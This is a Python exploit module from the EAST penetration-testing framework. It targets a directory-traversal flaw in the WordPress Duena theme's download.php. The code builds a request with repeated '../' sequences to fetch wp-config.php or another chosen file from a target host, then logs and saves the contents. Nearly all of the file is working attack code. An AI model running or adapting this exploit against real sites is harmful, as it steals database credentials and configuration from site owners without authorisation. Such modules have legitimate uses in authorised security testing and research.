#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import ssl
import urllib2
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_wordpress_duena_theme_fd"
INFO['DESCRIPTION'] = "Wordpress duena theme - Arbitrary file download"
INFO['VENDOR'] = ""
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://ru.0day.today/exploit/29598']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """The "f" parameter of download.php from themes/duena/download.php is not sanitized and is vulnerable to a directory traversal type of attack.
"""

INFO['CHANGELOG'] = "22 Jan 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS["BASEPATH"] = '/wordpress', dict(description = 'Basepath')
OPTIONS['PATH'] = 'wp-config.php', dict(description = 'Path to downloaded file at target machine')
OPTIONS["SSL"] = False, dict(description = 'Use SSL')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.basepath = '/'
        self.ssl = False
        self.path = OPTIONS['PATH']
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.path = self.args.get('PATH', OPTIONS['PATH'])
        self.basepath = self.args.get('BASEPATH', OPTIONS['BASEPATH'])
        self.ssl = bool(self.args.get('SSL', self.ssl))
        
        if self.ssl:
            context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
            opener = urllib2.build_opener(urllib2.HTTPSHandler(context=context))
            urllib2.install_opener(opener)
    
    def make_url(self, path = ''):
        return '{}{}:{}{}{}'.format(self.prot(), self.host, self.port, self.basepath, path)
    
    def prot(self):
        return self.ssl and 'https://' or 'http://'
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/wp-content/themes/duena/download.php?f=')
        url += '../' * 3
        url += self.path
        content = ''
        self.log('Try to download file ' + self.path)
        self.log(url)
        try:
            fd = urllib2.urlopen(url)
            content = fd.read()
            if content:
                self.log('= File Content =')
                self.log(content)
                self.log('= End of File  =')
                self.writefile(content)
                self.finish(True)
        except Exception as e:
            self.log(e)
                
        self.finish(False)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
